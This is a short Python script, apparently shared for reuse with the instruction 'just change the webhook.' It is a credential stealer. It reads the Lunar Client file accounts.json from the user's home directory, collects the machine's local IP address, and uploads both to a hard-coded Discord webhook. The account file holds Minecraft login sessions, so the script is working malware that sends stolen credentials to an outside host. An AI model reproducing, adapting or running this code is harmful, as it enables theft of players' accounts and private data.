just change the webhook.
import requests
import json
import socket
import os

def obtener_ip_local():
    try:
        # Crear un socket para obtener la dirección IP local
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip_local = s.getsockname()[0]
        s.close()
        return ip_local
    except Exception as e:
        return str(e)

def enviar_a_webhook(webhook_url, mensaje, archivo_path):
    files = {
        'file': (os.path.basename(archivo_path), open(archivo_path, 'rb'), 'application/json')
    }
    data = {
        "content": mensaje
    }

    response = requests.post(webhook_url, data=data, files=files)

    if response.status_code == 204:
        print("Mensaje y archivo enviados exitosamente.")
    else:
        print(f"Error al enviar el mensaje y el archivo: {response.status_code} - {response.text}")

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1378230478141919332/3jjvT-3bemxZqWNEVJpOoXyPBg0et80AsC2hMgSoopFHWE_Z-8js6CZ2Ai6rtCZ0RBSU"
    ip_local = obtener_ip_local()
    ruta_accounts = os.path.expanduser("~/.lunarclient/settings/game/accounts.json")

    mensaje = f"Dirección IP del dispositivo: {ip_local}"

    enviar_a_webhook(webhook_url, mensaje, ruta_accounts)
